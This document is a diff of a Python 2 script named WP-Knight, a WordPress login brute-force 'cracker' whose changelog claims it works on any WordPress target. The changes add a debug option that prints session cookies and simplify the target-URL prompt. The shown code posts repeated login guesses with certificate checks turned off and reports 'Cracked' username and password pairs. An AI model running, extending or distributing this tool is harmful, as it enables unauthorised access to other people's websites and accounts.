@@ -7,6 +7,10 @@
 
 # (6/19/2018) - Basic cracker function complete. Works perfectly on any WordPress target. New features will be added soon.
 
+# (11/8/2018) - SSL authentication glitch fixed.
+
+# TO-DO: Add threading capability
+
 import sys
 import requests
 from tqdm import tqdm
@@ -48,6 +52,7 @@ keyword2 = "Invalid"
 # Detecting empty field
 keyword3 = "empty"
 
+debug_Mode = False
 login_URL = None
 uname = None
 pwd = None
@@ -57,7 +62,7 @@ def console():
 		cmd = raw_input(" Enter command> ")
 		if cmd == "help" or cmd == "?":
 			print """\n Commands:
-	url - Set target URL ([website]/wp-login.php)
+	url - Specify target URL ( http://website.com/wp-login.php )
 	version - Check WordPress version
 	go - Activate WP-Knight
 	exit - Exit WP-Knight
@@ -88,11 +93,10 @@ def find_between( s, first, last ):
 def url_config():
 	global login_URL
 	global host
-	login_URL = raw_input("\n Enter target URL: ")
-	host = find_between(login_URL,"//","/")
-	login_URL = 'http://%s/wp-login.php' % (host)
-	print "\n Target: %s" % (login_URL)
-	print ""
+
+	login_URL = raw_input("\n Enter target URL> ")
+	print "\n Target: %s\n" % (login_URL)
+
 
 def versionCheck():
 	global login_URL
@@ -157,6 +161,10 @@ def bruteforce():
 					r = c.post(login_URL, data=login_data, headers=header_data, verify=False)
 
 					cookie = str(r.cookies)
+
+					if debug_Mode == True:
+						print "\n %s \n" % (cookie)
+
 					if cookie.find('settings')>-1 or cookie.find('=' + uname)>-1:
 						progressBar.close()
 						print "\n Cracked [ %s : %s ] \n" % (u,p)
